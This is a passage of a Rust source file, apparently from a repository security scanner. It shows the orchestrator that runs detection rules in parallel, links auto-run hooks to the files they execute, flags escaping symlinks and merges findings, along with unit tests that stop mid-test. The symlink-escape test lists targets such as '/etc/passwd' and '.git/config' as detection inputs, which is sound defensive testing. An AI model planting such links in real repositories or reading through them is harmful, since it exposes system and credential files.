//! The orchestrator behind `crate::scan` (Task 2): runs the rules over the files in parallel and
//! chains each auto-run surface to the files it runs.

use std::collections::{HashMap, HashSet};
use std::io;
use std::panic::{self, AssertUnwindSafe};
use std::path::PathBuf;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Instant;

use crate::rules::{agent, autorun, deps, exfil, hidden, payload, scanner};
use crate::shape::{self, Shape};
use crate::tree::{DiskTree, Entry, EntryKind};
use crate::yara::{self, YaraHit};
use crate::{FileCtx, FileKind, Finding, Group, Scan, Severity, Surface, Trigger, files};

/// How much of a file is read first, to tell a binary from text before the rest is read.
const HEAD: usize = 8 * 1024;
/// How much of a README is read to find its first paragraph.
const README_READ: usize = 16 * 1024;
const ABOUT_README_BYTES: usize = 600;
const ABOUT_DESCRIPTION_BYTES: usize = 200;

/// The functions the orchestrator calls. `REAL` holds the rule modules; a test swaps in stubs so the
/// orchestrator is checked on its own.
#[derive(Clone, Copy)]
pub(crate) struct Hooks {
    pub check: fn(&FileCtx, &mut Vec<Finding>),
    pub surfaces: fn(&FileCtx, &mut Vec<Finding>) -> Vec<Surface>,
    pub npm_scripts: fn(&FileCtx) -> Vec<(String, String)>,
    pub yara: fn(&FileCtx) -> Vec<YaraHit>,
    /// Called once with every path of the tree after the per-file rules ran: raises a name that
    /// looks like another path's twin from MEDIUM to HIGH.
    pub raise_twins: fn(&[&str], &mut [Finding]),
    /// Called once with every path of the tree, symlinks and unreadable entries included: adds the
    /// findings a path alone gives (a git hook).
    pub entry_findings: fn(&[&str], &mut Vec<Finding>),
    /// Called for each text file that mentions a git filter, once the per-file findings exist:
    /// raises a `.gitattributes` filter that the file tells you to configure.
    pub raise_filters: fn(&FileCtx, &mut [Finding]),
    pub is_instruction: fn(&str) -> bool,
    pub classify: fn(&str) -> Shape,
    pub files_run: fn(&str) -> Vec<String>,
    pub npm_run_target: fn(&str) -> Option<String>,
    pub severity: fn(Trigger, Shape, Option<Severity>) -> Severity,
}

pub(crate) const REAL: Hooks = Hooks {
    check: check_all,
    surfaces: surfaces_all,
    npm_scripts: autorun::npm_scripts,
    yara: yara_hits,
    raise_twins: hidden::raise_homoglyph_twins,
    entry_findings: autorun::entry_findings,
    raise_filters: autorun::raise_gitattributes_filters,
    is_instruction: agent::is_instruction,
    classify: shape::classify,
    files_run: shape::files_run,
    npm_run_target: shape::npm_run_target,
    severity: shape::severity,
};

fn check_all(f: &FileCtx, out: &mut Vec<Finding>) {
    hidden::check(f, out);
    payload::check(f, out);
    exfil::check(f, out);
    deps::check(f, out);
    scanner::check(f, out);
}

fn surfaces_all(f: &FileCtx, out: &mut Vec<Finding>) -> Vec<Surface> {
    let mut surfaces = autorun::surfaces(f, out);
    surfaces.extend(agent::surfaces(f, out));
    surfaces
}

fn yara_hits(f: &FileCtx) -> Vec<YaraHit> {
    yara::guarddog().eval(f)
}
pub(crate) fn run(tree: &DiskTree) -> Scan {
    run_with(tree, &REAL)
}

/// What the rules said about one file.
#[derive(Default)]
struct FileOut {
    /// The file was read and went through the rules.
    scanned: bool,
    kind: Option<FileKind>,
    findings: Vec<Finding>,
    yara: Vec<Finding>,
    surfaces: Vec<Surface>,
    /// The `scripts` of a `package.json`.
    scripts: Vec<(String, String)>,
    error: Option<String>,
    /// Code, config or agent text longer than the text cap: only its start was read.
    truncated: bool,
    /// The text of a file that may tell the reader to set up a git filter (`raise_filters`).
    filter_text: Option<String>,
}

pub(crate) fn run_with(tree: &DiskTree, hooks: &Hooks) -> Scan {
    let started = Instant::now();
    let entries = tree.entries();
    let mut scan = Scan::default();

    let mut content: Vec<Finding> = Vec::new();
    let mut yara_findings: Vec<Finding> = Vec::new();
    let mut surfaces: Vec<Surface> = Vec::new();
    let mut scripts: HashMap<String, Vec<(String, String)>> = HashMap::new();
    let mut truncated_paths: Vec<&str> = Vec::new();
    let mut filter_texts: Vec<(&str, Option<FileKind>, String)> = Vec::new();
    // Findings the orchestrator makes itself: symlink escapes and one per auto-run surface.
    let mut derived: Vec<Finding> = Vec::new();

    for entry in entries {
        if let EntryKind::Symlink { target } = &entry.kind
            && let Some(why) = symlink_escape(&entry.path, target)
        {
            derived.push(symlink_finding(entry, target, why));
        }
    }

    let files_at: Vec<usize> = entries
        .iter()
        .enumerate()
        .filter(|(_, e)| matches!(e.kind, EntryKind::File { .. }))
        .map(|(i, _)| i)
        .collect();
    let (outs, stopped) = analyze_all(tree, &files_at, hooks);
    if stopped {
        scan.errors
            .push("a scan worker stopped early; some files were not checked".to_string());
    }
    for (at, out) in outs {
        let entry = &entries[at];
        if let Some(error) = out.error {
            scan.errors.push(error);
        }
        if !out.scanned {
            continue;
        }
        scan.files += 1;
        if out.kind == Some(FileKind::Agent) {
            scan.instructions.push(entry.path.clone());
        }
        if out.truncated {
            truncated_paths.push(entry.path.as_str());
        }
        if let Some(text) = out.filter_text {
            filter_texts.push((entry.path.as_str(), out.kind, text));
        }
        content.extend(out.findings);
        yara_findings.extend(out.yara);
        surfaces.extend(out.surfaces);
        if is_package_json(&entry.path) {
            scripts.insert(dir_of(&entry.path).to_string(), out.scripts);
        }
    }
    scan.instructions.sort();
    note_truncated(&truncated_paths, tree.opts().text_cap, &mut scan.errors);

    // The files an auto-run command reaches, and the files that run by being in the tree.
    let mut reached: HashSet<String> = HashSet::new();
    for s in &surfaces {
        for arg in (hooks.files_run)(&s.command) {
            if let Some(path) = join_norm(&s.dir, &arg).filter(|p| !p.is_empty()) {
                reached.insert(path);
            }
        }
        if matches!(s.trigger, Trigger::Install | Trigger::Build) {
            reached.insert(s.path.clone());
        }
    }
    for entry in entries {
        if matches!(base_name(&entry.path), "setup.py" | "build.rs") {
            reached.insert(entry.path.clone());
        }
    }
    for mut f in yara_findings {
        if reached.contains(&f.path) && f.severity < Severity::High {
            f.severity = f.severity.up();
        }
        content.push(f);
    }
    let all_paths: Vec<&str> = entries.iter().map(|e| e.path.as_str()).collect();
    (hooks.raise_twins)(&all_paths, &mut content);
    (hooks.entry_findings)(&all_paths, &mut content);
    for (path, kind, text) in &filter_texts {
        let ctx = FileCtx {
            path,
            bytes: text.as_bytes(),
            text: Some(text),
            kind: kind.unwrap_or(FileKind::Data),
            truncated: false,
        };
        (hooks.raise_filters)(&ctx, &mut content);
    }

    let mut worst: HashMap<&str, Severity> = HashMap::new();
    for f in &content {
        let at = worst.entry(f.path.as_str()).or_insert(f.severity);
        *at = (*at).max(f.severity);
    }
    for s in &surfaces {
        derived.push(chain_finding(s, hooks, &scripts, &worst));
    }

    content.extend(derived);
    scan.findings = merge(content);
    scan.findings.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then(a.group.cmp(&b.group))
            .then_with(|| a.path.cmp(&b.path))
            .then(a.line.cmp(&b.line))
            .then_with(|| a.rule.cmp(&b.rule))
    });

    scan.about = about(tree);
    scan.skipped = tree.skipped().to_vec();
    scan.errors.splice(0..0, tree.errors().iter().cloned());
    scan.partial = tree.partial() || !scan.errors.is_empty();
    scan.scan_ms = u64::try_from(started.elapsed().as_millis()).unwrap_or(u64::MAX);
    scan
}

/// Lines for `errors` about code, config and agent files cut at the text cap: the scan is partial
/// then, because what lies past the cap was not read. Ten paths are named, then a count.
fn note_truncated(paths: &[&str], cap: usize, errors: &mut Vec<String>) {
    for path in paths.iter().take(10) {
        errors.push(format!(
            "{path:?} is longer than the {cap} byte read limit; only its start was scanned"
        ));
    }
    if paths.len() > 10 {
        errors.push(format!(
            "{} more files are longer than the read limit",
            paths.len() - 10
        ));
    }
}

/// Runs `analyze` over the files at `files_at` on up to eight threads; the result is in entry order.
/// The flag is true if a worker died, so some files were not checked.
fn analyze_all(
    tree: &DiskTree,
    files_at: &[usize],
    hooks: &Hooks,
) -> (Vec<(usize, FileOut)>, bool) {
    let workers = std::thread::available_parallelism()
        .map_or(1, |n| n.get())
        .min(8)
        .min(files_at.len().max(1));
    let next = AtomicUsize::new(0);
    let mut stopped = false;
    let mut outs: Vec<(usize, FileOut)> = std::thread::scope(|scope| {
        let handles: Vec<_> = (0..workers)
            .map(|_| {
                scope.spawn(|| {
                    let mut mine = Vec::new();
                    loop {
                        let i = next.fetch_add(1, Ordering::Relaxed);
                        let Some(&at) = files_at.get(i) else {
                            break;
                        };
                        mine.push((at, analyze(tree, &tree.entries()[at], hooks)));
                    }
                    mine
                })
            })
            .collect();
        let mut all = Vec::new();
        for handle in handles {
            match handle.join() {
                Ok(mine) => all.extend(mine),
                Err(_) => stopped = true,
            }
        }
        all
    });
    outs.sort_by_key(|(at, _)| *at);
    (outs, stopped)
}

/// Reads one file and runs every rule over it. A rule that panics is an error of this file, not the
/// end of the scan.
fn analyze(tree: &DiskTree, entry: &Entry, hooks: &Hooks) -> FileOut {
    let path = entry.path.as_str();
    let cap = tree.opts().text_cap;
    let failed = |e: io::Error| FileOut {
        // The read budget ending is reported once, as `partial`.
        error: (e.kind() != io::ErrorKind::QuotaExceeded)
            .then(|| format!("cannot read {path:?}: {e}")),
        ..FileOut::default()
    };
    let head_len = HEAD.min(cap);
    let mut bytes = match tree.read(path, head_len) {
        Ok(bytes) => bytes,
        Err(e) => return failed(e),
    };
    let kind = files::classify_with(path, &bytes, (hooks.is_instruction)(path));
    let more = entry.size > bytes.len() as u64;
    if more && bytes.len() == head_len && head_len < cap && kind != FileKind::Binary {
        bytes = match tree.read(path, cap) {
            Ok(bytes) => bytes,
            Err(e) => return failed(e),
        };
    }
    let truncated = entry.size > bytes.len() as u64;
    // Every file that is not a binary gets text, lossy where its bytes are not clean: no rule may
    // be skipped for one bad byte.
    let (text, flaw) = if kind == FileKind::Binary {
        (None, None)
    } else {
        let (text, flaw) = files::decode_lossy(if truncated {
            files::trim_incomplete(&bytes)
        } else {
            &bytes
        });
        (Some(text), flaw)
    };
    let ctx = FileCtx {
        path,
        bytes: &bytes,
        text: text.as_deref(),
        kind,
        truncated,
    };
    match panic::catch_unwind(AssertUnwindSafe(|| {
        let mut out = run_rules(&ctx, hooks);
        if is_git_config(path)
            && let Some(text) = ctx.text
        {
            for included in included_texts(tree, path, text, cap) {
                let part = run_rules(
                    &FileCtx {
                        text: Some(&included),
                        ..ctx
                    },
                    hooks,
                );
                out.findings.extend(part.findings);
                out.surfaces.extend(part.surfaces);
            }
        }
        out
    })) {
        Ok(mut out) => {
            out.scanned = true;
            out.kind = Some(kind);
            let strict = matches!(kind, FileKind::Code(_) | FileKind::Config | FileKind::Agent);
            let known = files::is_autorun_name(path);
            if strict && let Some((what, at)) = flaw {
                out.findings.push(not_utf8_finding(path, what, at, known));
            }
            if strict && truncated {
                out.truncated = true;
                if known || kind == FileKind::Agent {
                    out.findings.push(truncated_finding(path, bytes.len()));
                }
            }
            // Also a git hook: `raise_filters` lowers the finding of a stock hook stub.
            if (text.as_deref().is_some_and(|t| t.contains("filter."))
                && text.as_deref().is_some_and(|t| t.contains("git")))
                || autorun::is_git_hook(path)
            {
                out.filter_text = text;
            }
            out
        }
        Err(_) => FileOut {
            error: Some(format!(
                "a rule failed on {path:?}; the file was not checked"
            )),
            ..FileOut::default()
        },
    }
}

/// Whether `path` is a git config file that git reads: `.git/config` or `.git/config.worktree`,
/// at any depth.
fn is_git_config(path: &str) -> bool {
    ["config", "config.worktree"].iter().any(|name| {
        path.strip_suffix(name)
            .is_some_and(|d| d.ends_with(".git/"))
    })
}

/// The most files one config pulls in by `include`, counting the ones they pull in.
const MAX_INCLUDES: usize = 16;

/// The text of every file a git config pulls in with `[include]` or `[includeIf]`, found inside the
/// repo and followed through nested includes (a file is read once, so a loop ends). Git reads an
/// included file as part of the config, so the rules read it as part of the config too. A target
/// outside the repo is not read.
fn included_texts(tree: &DiskTree, path: &str, text: &str, cap: usize) -> Vec<String> {
    let Some(real) = tree.real_of(path) else {
        return Vec::new();
    };
    let mut seen: HashSet<PathBuf> = HashSet::from([real.clone()]);
    let mut work = vec![(real, text.to_string())];
    let mut found: Vec<String> = Vec::new();
    while let Some((file, body)) = work.pop() {
        let base = file.parent().unwrap_or(&file).to_path_buf();
        for target in include_targets(&body) {
            if found.len() >= MAX_INCLUDES {
                return found;
            }
            let Some(included) = tree.resolve_inside(&base, &target) else {
                continue;
            };
            if !seen.insert(included.clone()) {
                continue;
            }
            let Ok(bytes) = tree.read_real(&included, cap) else {
                continue;
            };
            let (text, _) = files::decode_lossy(files::trim_incomplete(&bytes));
            work.push((included, text.clone()));
            found.push(text);
        }
    }
    found
}

/// The `path = ...` values under `[include]` and `[includeIf "..."]` headers of a git config. A
/// home-relative (`~`) value is left out: it cannot be inside the repo.
fn include_targets(config: &str) -> Vec<String> {
    let mut targets = Vec::new();
    let mut in_include = false;
    for line in config.lines() {
        let line = line.trim();
        if let Some(header) = line.strip_prefix('[') {
            let name = header
                .split(|c: char| c == ']' || c.is_whitespace())
                .next()
                .unwrap_or("");
            in_include =
                name.eq_ignore_ascii_case("include") || name.eq_ignore_ascii_case("includeif");
            continue;
        }
        let Some((key, value)) = line.split_once('=') else {
            continue;
        };
        if !in_include || !key.trim().eq_ignore_ascii_case("path") {
            continue;
        }
        let value = value.trim();
        let value = match value.strip_prefix('"') {
            Some(rest) => rest.split('"').next().unwrap_or(""),
            None => value.split([';', '#']).next().unwrap_or("").trim(),
        };
        if !value.is_empty() && !value.starts_with('~') {
            targets.push(value.to_string());
        }
    }
    targets
}

fn not_utf8_finding(path: &str, what: &str, at: usize, known: bool) -> Finding {
    Finding {
        severity: if known { Severity::High } else { Severity::Medium },
        group: Group::Hidden,
        rule: "files.not-utf8".to_string(),
        path: path.to_string(),
        line: 0,
        why: "The file is not clean text. A strict reader (a JSON parser, npm, a shell) can stop at the bad byte where a lenient one reads on, so what the tool runs may differ from what a scan of the text sees. The rules ran on a lossy copy."
            .to_string(),
        seen: format!("{what} at byte {at}"),
        action: "Open the file in a hex view and find out why it has the byte before you open, install or build anything here."
            .to_string(),
        count: 1,
    }
}

fn truncated_finding(path: &str, read: usize) -> Finding {
    Finding {
        severity: Severity::High,
        group: Group::Hidden,
        rule: "files.truncated".to_string(),
        path: path.to_string(),
        line: 0,
        why: format!(
            "The file is longer than the {read} byte read limit, and it runs code or steers an agent. Whatever comes after the limit was not scanned; padding is a way to hide it."
        ),
        seen: format!("first {read} bytes read"),
        action: "Read the whole file before you open, install or build anything here.".to_string(),
        count: 1,
    }
}

fn run_rules(ctx: &FileCtx, hooks: &Hooks) -> FileOut {
    let mut out = FileOut::default();
    (hooks.check)(ctx, &mut out.findings);
    out.surfaces = (hooks.surfaces)(ctx, &mut out.findings);
    if matches!(ctx.kind, FileKind::Code(_)) {
        out.yara = (hooks.yara)(ctx)
            .into_iter()
            .map(|hit| yara_finding(ctx.path, hit))
            .collect();
    }
    if is_package_json(ctx.path) {
        out.scripts = (hooks.npm_scripts)(ctx);
    }
    out
}

/// GuardDog `high` is MEDIUM here, `medium` is LOW and `low` is INFO: a YARA hit alone is a lead,
/// not a verdict.
fn yara_finding(path: &str, hit: YaraHit) -> Finding {
    let severity = match hit.severity {
        "high" => Severity::Medium,
        "medium" => Severity::Low,
        _ => Severity::Info,
    };
    Finding {
        severity,
        group: Group::Yara,
        rule: format!("yara.{}", hit.rule),
        path: path.to_string(),
        line: hit.line,
        why: format!("The file matches the GuardDog threat rule {}.", hit.rule),
        seen: hit.seen,
        action: "Read this file before you run, install or build anything in this repo."
            .to_string(),
        count: 1,
    }
}

/// The finding for one auto-run surface: the command's shape on its trigger, raised when it runs a
/// file that has a HIGH or CRITICAL finding, and never below the surface's floor.
fn chain_finding(
    s: &Surface,
    hooks: &Hooks,
    scripts: &HashMap<String, Vec<(String, String)>>,
    worst: &HashMap<&str, Severity>,
) -> Finding {
    let mut shape = (hooks.classify)(&s.command);
    if let Some(name) = (hooks.npm_run_target)(&s.command)
        && let Some(dir) = join_norm(&s.dir, "")
        && let Some((_, script)) = scripts
            .get(&dir)
            .and_then(|list| list.iter().find(|(n, _)| *n == name))
    {
        shape = shape.max((hooks.classify)(script));
    }
    let reached = (hooks.files_run)(&s.command)
        .iter()
        .filter_map(|arg| join_norm(&s.dir, arg))
        .filter_map(|path| worst.get(path.as_str()).copied())
        .max();
    let severity = s.floor.max((hooks.severity)(s.trigger, shape, reached));
    let mut why = format!(
        "A command that runs {}. {}",
        trigger_text(s.trigger),
        shape_text(shape)
    );
    if let Some(r) = reached.filter(|r| *r >= Severity::High) {
        why.push_str(&format!(" A file it runs has a {} finding.", r.name()));
    }
    Finding {
        severity,
        group: if s.rule.starts_with("agent.") {
            Group::Agent
        } else {
            Group::Autorun
        },
        rule: s.rule.to_string(),
        path: s.path.clone(),
        line: s.line,
        why,
        seen: s.command.clone(),
        action: action_text(severity).to_string(),
        count: 1,
    }
}

fn trigger_text(t: Trigger) -> &'static str {
    match t {
        Trigger::Open => "when the repo is opened in an editor or an agent",
        Trigger::Install => "on install",
        Trigger::Build => "on build",
        Trigger::OptIn => "after you opt in (a git hook, direnv or a task runner)",
    }
}

fn shape_text(s: Shape) -> &'static str {
    match s {
        Shape::Allowlisted => "It is a known setup command.",
        Shape::Plain => "It runs a local command.",
        Shape::Runner => "It runs a package that is fetched when it starts.",
        Shape::Network => "It talks to a network host.",
        Shape::DecodeExec => "It decodes data and runs the result.",
        Shape::FetchExec => "It downloads code and runs it.",
        Shape::RunsData => "It runs a data file (a font, an image, a text file) as a program.",
    }
}

fn action_text(s: Severity) -> &'static str {
    if s >= Severity::High {
        "Read the command and the files it runs before you open, install or build this repo."
    } else if s == Severity::Medium {
        "Check that this project needs this command."
    } else {
        "Nothing to do unless the command is a surprise."
    }
}

fn symlink_finding(entry: &Entry, target: &str, why: &str) -> Finding {
    Finding {
        severity: Severity::High,
        group: Group::Autorun,
        rule: "autorun.symlink-escape".to_string(),
        path: entry.path.clone(),
        line: 0,
        why: format!(
            "A symlink that points {why}. A tool that follows it reads or writes outside the repo."
        ),
        seen: target.to_string(),
        action: "Do not open this repo until you know why the link is there. The scan did not follow it."
            .to_string(),
        count: 1,
    }
}

/// Why a symlink at `link` pointing at `target` leaves the repo, as the end of the sentence "A
/// symlink that points ...": an absolute path, a path above the root, or a path into `.git`.
pub(crate) fn symlink_escape(link: &str, target: &str) -> Option<&'static str> {
    if is_absolute_like(target) {
        return Some("to an absolute path");
    }
    let mut stack: Vec<&str> = link.split('/').collect();
    stack.pop();
    for part in target.split(['/', '\\']) {
        match part {
            "" | "." => {}
            ".." => {
                if stack.pop().is_none() {
                    return Some("outside the repo");
                }
            }
            part => stack.push(part),
        }
    }
    stack
        .iter()
        .any(|part| part.eq_ignore_ascii_case(".git"))
        .then_some("into .git")
}

fn is_absolute_like(p: &str) -> bool {
    let b = p.as_bytes();
    p.starts_with(['/', '\\']) || (b.len() >= 2 && b[0].is_ascii_alphabetic() && b[1] == b':')
}

/// `rel` below the folder `base`, with `.` and `..` resolved; `None` if it is absolute or leaves
/// the root. The result is empty for the root itself.
fn join_norm(base: &str, rel: &str) -> Option<String> {
    let rel = rel.trim_matches(['"', '\'']);
    if is_absolute_like(rel) {
        return None;
    }
    let mut stack: Vec<&str> = base
        .split('/')
        .filter(|part| !part.is_empty() && *part != ".")
        .collect();
    for part in rel.split(['/', '\\']) {
        match part {
            "" | "." => {}
            ".." => {
                stack.pop()?;
            }
            part => stack.push(part),
        }
    }
    Some(stack.join("/"))
}

fn base_name(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

fn dir_of(path: &str) -> &str {
    path.rsplit_once('/').map_or("", |(dir, _)| dir)
}

fn is_package_json(path: &str) -> bool {
    base_name(path) == "package.json"
}

/// Folds the findings of one rule on one path into one: the highest severity (its first one on a
/// tie) with the hits added up in `count`.
fn merge(findings: Vec<Finding>) -> Vec<Finding> {
    let mut at: HashMap<(String, String), usize> = HashMap::new();
    let mut out: Vec<Finding> = Vec::new();
    for mut f in findings {
        f.count = f.count.max(1);
        match at.entry((f.rule.clone(), f.path.clone())) {
            std::collections::hash_map::Entry::Occupied(slot) => {
                let kept = &mut out[*slot.get()];
                let count = kept.count + f.count;
                if f.severity > kept.severity {
                    *kept = f;
                }
                kept.count = count;
            }
            std::collections::hash_map::Entry::Vacant(slot) => {
                slot.insert(out.len());
                out.push(f);
            }
        }
    }
    out
}

/// What the repo says it is: the first paragraph of its README, then the `description` of
/// `package.json`, `pyproject.toml` and `Cargo.toml`, one `file: text` line each.
fn about(tree: &DiskTree) -> String {
    let at_root = |want: &dyn Fn(&str) -> bool| {
        tree.entries()
            .iter()
            .find(|e| {
                matches!(e.kind, EntryKind::File { .. }) && !e.path.contains('/') && want(&e.path)
            })
            .map(|e| e.path.as_str())
    };
    let mut lines: Vec<String> = Vec::new();
    let readme = at_root(&|name| {
        matches!(
            name.to_ascii_lowercase().as_str(),
            "readme"
                | "readme.md"
                | "readme.markdown"
                | "readme.rst"
                | "readme.txt"
                | "readme.adoc"
        )
    });
    if let Some(name) = readme
        && let Some(text) = read_text(tree, name, README_READ)
        && let Some(paragraph) = first_paragraph(&text)
    {
        lines.push(format!("{name}: {}", cut(&paragraph, ABOUT_README_BYTES)));
    }
    for name in ["package.json", "pyproject.toml", "Cargo.toml"] {
        let Some(name) = at_root(&|n| n == name) else {
            continue;
        };
        let Some(text) = read_text(tree, name, tree.opts().text_cap) else {
            continue;
        };
        let description = if name == "package.json" {
            json_description(&text)
        } else {
            toml_description(&text)
        };
        if let Some(d) = description {
            let d = d.split_whitespace().collect::<Vec<_>>().join(" ");
            if !d.is_empty() {
                lines.push(format!("{name}: {}", cut(&d, ABOUT_DESCRIPTION_BYTES)));
            }
        }
    }
    lines.join("\n")
}

fn read_text(tree: &DiskTree, path: &str, max: usize) -> Option<String> {
    let bytes = tree.read(path, max).ok()?;
    files::decode(files::trim_incomplete(&bytes))
}

/// The first paragraph that is prose: not a heading, a badge line, an HTML tag or an underline.
fn first_paragraph(text: &str) -> Option<String> {
    let mut para: Vec<&str> = Vec::new();
    for line in text.lines().chain(std::iter::once("")) {
        let line = line.trim();
        if !line.is_empty() {
            para.push(line);
            continue;
        }
        if para.is_empty() {
            continue;
        }
        let first = para[0];
        let skip = first.starts_with(['#', '<'])
            || first.starts_with("![")
            || first.starts_with("[![")
            || para
                .iter()
                .any(|l| l.len() >= 3 && l.chars().all(|c| matches!(c, '=' | '-' | '~')));
        if !skip {
            return Some(para.join(" "));
        }
        para.clear();
    }
    None
}

fn json_description(text: &str) -> Option<String> {
    let value = anthology_pycompat::json::loads(text).ok()?;
    let description = value.as_object()?.get("description")?.as_str()?;
    Some(description.to_string())
}

/// The first `description = "..."` line of a TOML file, in single or double quotes.
fn toml_description(text: &str) -> Option<String> {
    text.lines().find_map(|line| {
        let rest = line
            .trim()
            .strip_prefix("description")?
            .trim_start()
            .strip_prefix('=')?
            .trim_start();
        let quote = rest.chars().next().filter(|q| matches!(*q, '"' | '\''))?;
        let body = &rest[1..];
        Some(body[..body.find(quote)?].to_string())
    })
}

/// `s` cut to at most `max` bytes on a character boundary.
fn cut(s: &str, max: usize) -> &str {
    let mut end = max.min(s.len());
    while !s.is_char_boundary(end) {
        end -= 1;
    }
    &s[..end]
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::Group;
    use crate::files;
    use crate::tree::WalkOpts;
    use std::fs;
    use std::os::unix::fs::symlink;
    use std::path::Path;

    const SENTINEL: &str = "SENTINEL-must-never-be-read";

    fn write(root: &Path, rel: &str, body: &[u8]) {
        let p = root.join(rel);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(p, body).unwrap();
    }

    fn quiet() -> Hooks {
        Hooks {
            check: |_, _| {},
            surfaces: |_, _| Vec::new(),
            npm_scripts: |_| Vec::new(),
            yara: |_| Vec::new(),
            raise_twins: |_, _| {},
            entry_findings: |_, _| {},
            raise_filters: |_, _| {},
            is_instruction: |_| false,
            classify: |_| Shape::Plain,
            files_run: |_| Vec::new(),
            npm_run_target: |_| None,
            severity: |_, _, _| Severity::Info,
        }
    }

    fn scan_opts(root: &Path, o: WalkOpts, h: Hooks) -> Scan {
        let tree = DiskTree::open(root, &o, None).unwrap();
        run_with(&tree, &h)
    }

    fn scan_with(root: &Path, h: Hooks) -> Scan {
        scan_opts(root, WalkOpts::default(), h)
    }

    fn finding(rule: &str, path: &str, severity: Severity, line: usize, count: usize) -> Finding {
        Finding {
            severity,
            group: Group::Hidden,
            rule: rule.to_string(),
            path: path.to_string(),
            line,
            why: "why".to_string(),
            seen: String::new(),
            action: "act".to_string(),
            count,
        }
    }

    fn by_rule<'a>(s: &'a Scan, rule: &str, path: &str) -> &'a Finding {
        s.findings
            .iter()
            .find(|f| f.rule == rule && f.path == path)
            .unwrap_or_else(|| panic!("no {rule} on {path}: {:#?}", s.findings))
    }

    fn echo_rule(f: &FileCtx, out: &mut Vec<Finding>) {
        let mut x = finding("echo.file", f.path, Severity::Info, 1, 1);
        x.seen = f.text.unwrap_or("").to_string();
        out.push(x);
    }

    #[test]
    fn symlink_targets_are_never_read() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), "outside/secret", SENTINEL.as_bytes());
        write(tmp.path(), "repo/ok.txt", b"fine");
        symlink("../outside/secret", tmp.path().join("repo/link")).unwrap();
        symlink(
            tmp.path().join("outside/secret"),
            tmp.path().join("repo/abs"),
        )
        .unwrap();
        symlink("../outside", tmp.path().join("repo/dir")).unwrap();
        let h = Hooks {
            check: echo_rule,
            ..quiet()
        };
        let s = scan_with(&tmp.path().join("repo"), h);
        let all = format!("{s:?}");
        assert!(!all.contains(SENTINEL), "{all}");
        let echoed: Vec<&str> = s
            .findings
            .iter()
            .filter(|f| f.rule == "echo.file")
            .map(|f| f.path.as_str())
            .collect();
        assert_eq!(echoed, ["ok.txt"]);
        assert_eq!(s.files, 1);
        for link in ["link", "abs", "dir"] {
            let f = by_rule(&s, "autorun.symlink-escape", link);
            assert_eq!(f.severity, Severity::High, "{link}");
            assert_eq!(f.group, Group::Autorun);
            assert!(!f.why.is_empty() && !f.action.is_empty());
        }
        assert_eq!(
            by_rule(&s, "autorun.symlink-escape", "link").seen,
            "../outside/secret"
        );
    }

    #[test]
    fn a_symlink_that_stays_inside_is_not_reported() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), "src/main.rs", b"fn main() {}");
        symlink("src/main.rs", tmp.path().join("entry")).unwrap();
        let s = scan_with(tmp.path(), quiet());
        assert!(s.findings.is_empty(), "{:?}", s.findings);
    }

    #[test]
    fn symlink_escape_covers_absolute_outside_and_git_targets() {
        let escapes = [
            ("l", "/etc/passwd"),
            ("l", "\\\\host\\share"),
            ("l", "C:\\Windows"),
            ("l", "../x"),
            ("a/l", "../../x"),
            ("l", ".git/hooks/x"),
            ("a/l", "../.git/config"),
            ("l", "sub/../.git"),
            ("l", ".GIT/x"),
        ];
        for (link, target) in escapes {
            assert!(
                symlink_escape(link, target).is_some(),
                "{link} -> {target} should escape"
            );
        }
        let stays = [
            ("a/l", "../b"),
            ("l", "src/main.rs"),
            ("l", "./a/./b"),
            ("l", ".github/x"),
            ("l", ""),
            ("a/b/l", "../../c/d"),
        ];
        for (link, target) in stays {
            assert_eq!(
                symlink_escape(link, target),
                None,
                "{link} -> {target} stays inside"
            );
        }
    }

    #[test]
    fn skips_node_modules_and_worktrees() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), "a.js", b"x");
        write(tmp.path(), "node_modules/dep/index.js", b"x");
        write(tmp.path(), ".claude/worktrees/w1/a.js", b"x");
        let h = Hooks {
            check: echo_rule,
            ..quiet()
        };
        let s = scan_with(tmp.path(), h);
        assert_eq!(s.files, 1);
        let mut skipped = s.skipped.clone();
        skipped.sort();
        assert_eq!(skipped, [".claude/worktrees/", "node_modules/"]);
        assert!(!s.partial);
    }

    #[test]
    fn caps_mark_partial() {
        let tmp = tempfile::tempdir().unwrap();
        for i in 0..5 {
            write(tmp.path(), &format!("f{i}.txt"), b"x");
        }
        let o = WalkOpts {
            max_files: 2,
            ..WalkOpts::default()
        };
        let s = scan_opts(tmp.path(), o, quiet());
        assert!(s.partial);
        assert_eq!(s.files, 2);

        let o = WalkOpts {
            max_bytes: 3,
            ..WalkOpts::default()
        };
        write(tmp.path(), "big.txt", &[b'a'; 50]);
        let s = scan_opts(tmp.path(), o, quiet());
        assert!(s.partial, "the read budget was spent");
        assert!(s.errors.is_empty(), "{:?}", s.errors);
    }

    #[test]
    fn a_complete_scan_is_not_partial() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), "a.txt", b"x");
        let s = scan_with(tmp.path(), quiet());
        assert!(!s.partial);
        assert!(s.errors.is_empty());
    }

    #[test]
    fn critical_beats_partial() {
        let tmp = tempfile::tempdir().unwrap();
        for p in ["a.txt", "evil.js", "z.txt", "zz.txt"] {
            write(tmp.path(), p, b"x");
        }
        let h = Hooks {
            check: |f, out| {
                if f.path == "evil.js" {
                    out.push(finding("stub.bad", f.path, Severity::Critical, 1, 1));
                }
            },
            ..quiet()
        };
        let o = WalkOpts {
            max_files: 2,
            ..WalkOpts::default()
        };
        let s = scan_opts(tmp.path(), o, h);
        // A partial scan keeps what it found: the exit code (Task 7) lets CRITICAL win over partial.
        assert!(s.partial);
        assert_eq!(
            by_rule(&s, "stub.bad", "evil.js").severity,
            Severity::Critical
        );
    }

    #[test]
    fn decodes_utf16_bom_and_counts_crlf() {
        let tmp = tempfile::tempdir().unwrap();
        let text = "one\r\ntwo\r\nneedle\r\n";
        let mut le = vec![0xff, 0xfe];
        le.extend(text.encode_utf16().flat_map(|u| u.to_le_bytes()));
        write(tmp.path(), "utf16.txt", &le);
        write(tmp.path(), "crlf.txt", text.as_bytes());
        write(tmp.path(), "bad.txt", b"ab\xff needle");
        let h = Hooks {
            check: |f, out| {
                if let Some(t) = f.text
